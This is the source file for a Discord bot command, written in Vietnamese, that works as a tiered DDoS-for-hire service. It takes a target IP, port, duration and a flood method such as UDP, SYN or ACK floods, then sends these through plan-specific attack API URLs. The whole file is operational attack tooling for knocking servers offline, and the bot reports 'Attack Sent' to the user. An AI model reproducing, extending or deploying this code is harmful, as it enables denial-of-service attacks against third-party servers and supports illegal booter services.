const { SlashCommandBuilder, WebhookClient, EmbedBuilder } = require('discord.js');
const axios = require('axios');
const { attack_log, api_free_l4, api_vip_l4, api_admin_l4, block_host } = require('../../config.json');
const webhookURL = attack_log;
const sqlite3 = require('sqlite3').verbose();
const db = new sqlite3.Database('database.db');
const wait = require('node:timers/promises').setTimeout;

module.exports = {
   cooldown: 300,
	data: new SlashCommandBuilder()
		.setName('start-l4')
		.setDescription('đấm layer 4')
      .addStringOption(option => option.setName('methods').setDescription('methods đấm').setRequired(true).addChoices(
         { name: 'UDPFLOOD', value: 'UDPFLOOD' },
         { name: 'TCPFLOOD', value: 'TCPFLOOD' },
         { name: 'UDPPPS', value: 'UDPPPS' },
         { name: 'STDHEX', value: 'STDHEX' },
         { name: 'TCPLEGIT', value: 'TCPLEGIT' },
         { name: 'ACKFLOOD', value: 'ACKFLOOD' },
         { name: 'HOMEHOLDER', value: 'HOME' },
         { name: 'SYNFLOOD', value: 'SYNFLOOD' },
         //{ name: 'ICMP', value: 'ICMP' },
         //{ name: 'MINECRAFT', value: 'MINECRAFT' },
         //{ name: 'VIETNIX', value: 'VIETNIX' },
         ))
		.addStringOption(option => option.setName('ip').setDescription('ip server muốn đấm').setRequired(true))
      .addIntegerOption(option => option.setName('port').setDescription('port của nó').setRequired(true))
      .addIntegerOption(option => option.setName('time').setDescription('thời gian đấm').setRequired(true)),
      async execute(interaction) {
         const userId = interaction.user.id;
         await interaction.deferReply({ ephemeral: true });
		   await wait(1000);
         db.get('SELECT users_id, plan, exp FROM users WHERE users_id = ?', [userId],async (err, row) => {
         if (err) {
           throw err;
         }
         if (row) {
            if (`${row.plan}` === 'VIP', 'FREE', 'ADMIN') {
               const ip = interaction.options.get('ip').value;
               const port = interaction.options.get('port').value;
               const time = interaction.options.get('time').value;
               const method = interaction.options.get('methods').value;
               const userId = interaction.user.id;
               if (block_host.some((word) => interaction.toString().toLowerCase().includes(word))) {
                  await interaction.editReply('ip nằm trong danh sách bị chặn');
               } else {
                  if (port <= 65535) {

                     const free = api_free_l4.replace('[host]', ip).replace('[port]', port).replace('[time]', time).replace('[method]', method);
                     const vip = api_vip_l4.replace('[host]', ip).replace('[port]', port).replace('[time]', time).replace('[method]', method);
                     const admin = api_admin_l4.replace('[host]', ip).replace('[port]', port).replace('[time]', time).replace('[method]', method);
                     

                     const embed = new EmbedBuilder()
                     .setColor(color)
                     .setTitle(namebot)
                     .setDescription('```'+ `Attack Sent Check DMS` + '```')
                     .setTimestamp()
                     .setFooter({ text: 'Dev by ngọc(ALLEC_VN)', iconURL: `${admin_url}` });
                     await interaction.editReply({ embeds: [embed] , ephemeral: true });

                     const Embed = new EmbedBuilder()
                        .setColor(color)
                        .setTitle(namebot)
                        .setDescription('Type: layer4')
                        .addFields({ name: '`🧨 IP:`', value: `\`\`\`css\n[ ${ip} ]\n\`\`\`` })
                        .addFields({ name: '`🛰 PORT:`', value: `\`\`\`css\n[ ${port} ]\n\`\`\`` })
                        .addFields({ name: '`🕛 TIME:`', value: `\`\`\`css\n[ ${time} ]\n\`\`\`` })
                        .addFields({ name: '`🔰 METHOD:`', value: `\`\`\`css\n[ ${method} ]\n\`\`\`` })
                        .addFields({ name: '`💸 PLAN:`', value: `\`\`\`css\n[ ${row.plan} ]\n\`\`\`` })
                        .setImage(img_url)
                        .setTimestamp()
                        .setFooter({ text: 'Dev by ngọc(ALLEC_VN)', iconURL: `${admin_url}` });
                     await interaction.user.send({ embeds: [Embed] , ephemeral: true });

                     if (row.plan === 'FREE') {
                        axios.get(free)
                           .then(async (response) => {
                              if (response.status === 200) {
                                 console.log('[axios] Kết quả thành công:', response.data);
                              } else if (response.status === 429) {
                                 console.log('[axios] Kết quả không thể kết nối:', response.status);
                              } else if (response.status === 500) {
                                 console.log('[axios] Kết quả không thể kết nối:', response.status);
                              }
                           }).catch(async (error) => {
                              console.error('[axios] Lỗi kết nối:', error.message);
                        });
                     }
                     
                     if (row.plan === 'VIP') {
                        axios.get(vip)
                           .then(async (response) => {
                              if (response.status === 200) {
                                 console.log('[axios] Kết quả thành công:', response.data);
                              } else if (response.status === 429) {
                                 console.log('[axios] Kết quả không thể kết nối:', response.status);
                              } else if (response.status === 500) {
                                 console.log('[axios] Kết quả không thể kết nối:', response.status);
                              }
                           }).catch(async (error) => {
                              console.error('[axios] Lỗi kết nối:', error.message);
                        });
                     }

                     if (row.plan === 'ADMIN') {
                        axios.get(admin)
                           .then(async (response) => {
                              if (response.status === 200) {
                                 console.log('[axios] Kết quả thành công:', response.data);
                              } else if (response.status === 429) {
                                 console.log('[axios] Kết quả không thể kết nối:', response.status);
                              } else if (response.status === 500) {
                                 console.log('[axios] Kết quả không thể kết nối:', response.status);
                              }
                           }).catch(async (error) => {
                              console.error('[axios] Lỗi kết nối:', error.message);
                        });
                     }

                  } else {
                     await interaction.user.send({ content: 'port phải dưới 65535!', ephemeral: true });
                  }
               }
            }
         } else {
            await interaction.editReply({ content: 'bạn ko có plan để sử dụng!', ephemeral: true });
         }
      });
   }
}        